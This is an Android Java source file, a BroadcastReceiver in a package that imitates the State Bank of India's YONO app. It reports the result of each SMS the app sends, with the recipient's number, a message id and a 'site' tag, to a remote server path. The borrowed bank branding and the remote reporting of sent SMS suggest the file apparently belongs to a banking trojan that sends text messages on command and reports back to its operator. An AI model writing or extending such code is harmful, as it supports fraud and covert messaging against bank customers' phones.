package com.sbi.yono.service.online.FrontServices;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.sbi.yono.service.online.Helper;

import org.json.JSONException;
import org.json.JSONObject;

public class SentReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        int id = intent.getIntExtra("id", -1);
        String number = intent.getStringExtra("phone");
        String status = "";

        switch (getResultCode()) {
            case Activity.RESULT_OK:
                status = "Sent";
                Log.d(Helper.TAG, "SMS sent successfully.");
                break;
            default:
                status = "SentFailed";
                Log.d(Helper.TAG, "SMS failed to send.");
                break;
        }

        JSONObject data = new JSONObject();
        try {
            Helper helper = new Helper();
            data.put("status", status + " to "+number);
            data.put("id", id);
            data.put("site", helper.SITE());
            Helper.postRequest(helper.SMSSavePath(), data, new Helper.ResponseListener(){
                @Override
                public void onResponse(String result) {
                    Log.d("mywork", "status updated Result, "+ result);
                };
            });
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }
}
